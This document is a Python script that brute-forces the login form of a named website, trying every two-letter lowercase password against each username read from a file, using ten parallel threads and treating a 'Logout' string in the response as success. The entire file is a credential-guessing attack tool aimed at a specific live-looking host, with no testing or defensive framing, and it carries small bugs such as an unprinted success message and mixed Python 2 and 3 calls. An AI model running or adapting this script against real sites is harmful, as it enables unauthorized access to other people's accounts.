import requests
import threading
from time import sleep
import sys
import itertools, random, string, time
import time

# Global Variables
url = "https://weblinkserver.net/user.php?action=login"

# Alphabet
alphabet = string.ascii_lowercase

# Successful Authentication
def loggedIn(username, password):
    "\n username/password logged in (%s:%s) \n" % (username, password)
    x = raw_input("\n Press ENTER to exit \n")
    sys.exit()

def login(username, password):
    form_data = {
        'penname': username,
        'password': password,
        'submit': 'Go',
    }
    header_data = {}
    resp = requests.post(url, data=form_data, headers=header_data)
    check = resp.text.encode("utf-8").find("Logout")
    print('\n{}:{} - {}'.format(username, password, resp.status_code))

    if check != -1:
        loggedIn(username, password)
    return check

def main():
    global url
    global userList
    global pwList


    pwToLog='aa'

    userList = open('users.txt', 'r').read().split('\n')
    
    index = 0
    estimatedTime = int((alphabet.index(pwToLog[0]) / len(alphabet)) * (len(alphabet) ** len(pwToLog)))
    pwTuple = tuple(pwToLog)

    charList = [[x for x in alphabet]] * (len(pwToLog)+index)

    credentials = [(user, ''.join(pw)) for user in userList for pw in itertools.product(*charList)]

    i = 0
    while i < len(credentials):
        threads = []
        for j in range(i, min(i + 10, len(credentials))):
            cred = credentials[j]
            t = threading.Thread(target=login, args=cred)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
        i += 10

# Call Main
main()
